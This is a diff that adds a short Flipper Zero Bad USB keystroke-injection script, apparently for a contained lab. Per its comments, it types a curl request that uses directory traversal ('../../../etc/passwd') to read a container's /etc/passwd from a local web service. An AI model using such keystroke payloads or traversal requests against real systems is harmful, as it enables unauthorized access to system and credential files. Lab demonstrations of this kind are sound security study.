@@ -1,0 +1,6 @@
+REM Flipper Zero Bad USB — read /etc/passwd via directory traversal
+REM Reads the container's /etc/passwd, not the Pi's real one.
+
+DELAY 1000
+STRING curl -s "http://localhost:5000/files?file=../../../etc/passwd"
+ENTER
